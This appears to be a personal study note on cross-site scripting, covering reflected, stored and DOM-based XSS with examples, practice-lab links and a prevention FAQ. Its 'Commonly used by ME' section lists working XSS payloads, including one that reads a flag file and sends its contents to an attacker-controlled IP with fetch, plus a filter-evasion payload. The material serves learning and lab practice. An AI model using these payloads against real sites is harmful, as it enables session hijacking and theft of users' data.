---
title: Cross-Site Scripting (XSS)
aliases:
  - Cross-Site Scripting (XSS)
description: Cross-site scripting (XSS) is an attack in which an attacker injects malicious executable scripts into the code of a trusted application or website.
tags:
  - XSS
  - Reflected
  - Stored
  - DOM-Based
  - Q/A
---
## What is cross-site scripting (XSS)?
---
Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data.

## What are the types of XSS attacks?
---
There are three main types of XSS attacks. These are:

- **Reflected XSS**, where the malicious script comes from the current HTTP request.
- **Stored XSS**, where the malicious script comes from the website's database.
- **DOM-based XSS**, where the vulnerability exists in client-side code rather than server-side code.
### **Reflected cross-site scripting**

Reflected XSS is the simplest variety of cross-site scripting. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.

Here is a simple example of a reflected XSS vulnerability:

```html
https://insecure-website.com/status?message=All+is+well. 

<p>Status: All is well.</p>
```

The application doesn't perform any other processing of the data, so an attacker can easily construct an attack like this:

```html
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script> 

<p>Status: <script>/* Bad stuff here... */</script></p>
```

If the user visits the URL constructed by the attacker, then the attacker's script executes in the user's browser, in the context of that user's session with the application. At that point, the script can carry out any action, and retrieve any data, to which the user has access.

For Hands-on Practice you can try to solve this **labs/ctfs**:
- [Portswigger LAB](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)  - WriteUp [[LAB 0.1|LAB 0.1]]

### **Stored cross-site scripting**

Stored XSS (also known as persistent or second-order XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

The data in question might be submitted to the application via HTTP requests; for example, comments on a blog post, user nicknames in a chat room, or contact details on a customer order. In other cases, the data might arrive from other untrusted sources; for example, a webmail application displaying messages received over SMTP, a marketing application displaying social media posts, or a network monitoring application displaying packet data from network traffic.

Here is a simple example of a stored XSS vulnerability. Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:

```js
POST /post/comment HTTP/1.1 
Host: vulnerable-website.com 
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

After this comment has been submitted, any user who visits the blog post will receive the following within the application's response:

```js
<p>This post was extremely helpful.</p>
```

Assuming the application doesn't perform any other processing of the data, an attacker can submit a malicious comment like this:

```js
<script>/* Bad stuff here... */</script>
```

Within the attacker's request, this comment would be URL-encoded as:

```js
comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
```

Any user who visits the blog post will now receive the following within the application's response:

```js
<p><script>/* Bad stuff here... */</script></p>
```

The script supplied by the attacker will then execute in the victim user's browser, in the context of their session with the application.

For Hands-on Practice you can try to solve this **labs/ctfs**:
- [Portswigger LAB](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)  - WriteUp [[LAB 0.2|LAB 0.2]]

### **DOM-based cross-site scripting**

DOM-based XSS (also known as DOM XSS) arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.

In the following example, an application uses some JavaScript to read the value from an input field and write that value to an element within the HTML:

```js
var search = document.getElementById('search').value; 
var results = document.getElementById('results'); 
results.innerHTML = 'You searched for: ' + search;
```

If the attacker can control the value of the input field, they can easily construct a malicious value that causes their own script to execute:

```html
You searched for: <img src=1 onerror='/* Bad stuff here... */'>
```

In a typical case, the input field would be populated from part of the HTTP request, such as a URL query string parameter, allowing the attacker to deliver an attack using a malicious URL, in the same manner as reflected XSS.

For more Information refer [[DOM-based]].

For Hands-on Practice you can try to solve this **labs/ctfs**:
- [Portswigger LAB](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink) - Write-up [[LAB 0.3|LAB 0.3]]
- [Portswigger LAB](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element) - Write-up [[LAB 0.4|LAB 0.4]]
- [Portswigger LAB](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink) - Write-up [[LAB 0.5]]
- [Portswigger LAB](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink) - Write-up [[LAB 0.6|LAB 0.6]]
## Crowd Sourcing
---
One of my favorite methods to find a huge number of valid XSS vulnerabilities is to visit http://www.reddit.com/r/xss. People will post on that sub-reddit the different XSS findings they have.

## OWASP Cheat Sheet
---
The other list I wish to mention that I’ve used often is OWASP Evasion Cheat Sheet. During my engagements, when I run into an encoding problem this is usually the first place I look. The cheat sheet can be found here: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet. The most common XSS protections I find are length issues and not allowing greater/less  han symbols. Luckily, the OWASP has any different examples to get around these issues.

# Cross-site scripting (XSS) cheat sheet
---
This cross-site scripting (XSS) cheat sheet contains many vectors that can help you bypass WAFs and filters. You can select vectors by the event, tag or browser and a proof of concept is included for every vector.
You can [download a PDF version of the XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet.pdf).
[CheetSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
## Commonly used by ME
---
>[!Payloads]
>`<img src=x onerror="fetch('http://10.11.116.53:8080')"/>`
>
>`<img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r => r.text()).then(r => fetch('http://10.11.116.53:8080/?c=' + r)).catch(e => fetch('http://10.11.116.53:8080/?c=' + e))"/>`
>
>`"%5c"><body%2fonload%3d%26lt%3b!--%26gt%3b%26%2310confirm(1)%3bprompt(%2fXSS%2f.source)>"%2c`






## Commonly Asked Question
---
**How common are XSS vulnerabilities?** 
XSS vulnerabilities are very common, and XSS is probably the most frequently occurring web security vulnerability.

**How common are XSS attacks?** 
It is difficult to get reliable data about real-world XSS attacks, but it is probably less frequently exploited than other vulnerabilities.

**What is the difference between XSS and CSRF?** 
XSS involves causing a web site to return malicious JavaScript, while CSRF involves inducing a victim user to perform actions they do not intend to do.

**What is the difference between XSS and SQL injection?**
XSS is a client-side vulnerability that targets other application users, while SQL injection is a server-side vulnerability that targets the application's database.

**How do I prevent XSS in PHP?** 
Filter your inputs with a whitelist of allowed characters and use type hints or type casting. Escape your outputs with `htmlentities` and `ENT_QUOTES` for HTML contexts, or JavaScript Unicode escapes for JavaScript contexts.

**How do I prevent XSS in Java?** 
Filter your inputs with a whitelist of allowed characters and use a library such as Google Guava to HTML-encode your output for HTML contexts, or use JavaScript Unicode escapes for JavaScript contexts.

**What is the difference between reflected XSS and stored XSS?** 
Reflected XSS arises when an application takes some input from an HTTP request and embeds that input into the immediate response in an unsafe way. With stored XSS, the application instead stores the input and embeds it into a later response in an unsafe way.

**What is the difference between reflected XSS and self-XSS?** 
Self-XSS involves similar application behavior to regular reflected XSS, however it cannot be triggered in normal ways via a crafted URL or a cross-domain request. Instead, the vulnerability is only triggered if the victim themselves submits the XSS payload from their browser. Delivering a self-XSS attack normally involves socially engineering the victim to paste some attacker-supplied input into their browser. As such, it is normally considered to be a lame, low-impact issue.